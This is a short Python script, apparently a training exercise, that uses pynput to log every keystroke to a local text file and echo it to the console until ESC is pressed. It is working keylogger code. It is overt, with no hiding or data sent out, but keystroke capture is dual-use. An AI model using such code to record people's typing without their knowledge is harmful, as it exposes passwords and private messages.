from pynput import keyboard

def onPress(key):
    log_file=open("C:\\Users\\gobhi\\OneDrive\\Desktop\\Prodigy\\keyfile.txt", "a")
    try:
        char=key.char

    except AttributeError:
        char=str(key)
    print(f"Keys: {key}")
    log_file.write(f"{char}\n")
    log_file.close()
    if(char=="Key.esc"):
        return False
    
def main():
    print("Press ESC to quit logging.")
    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()

if __name__ == "__main__":
    main()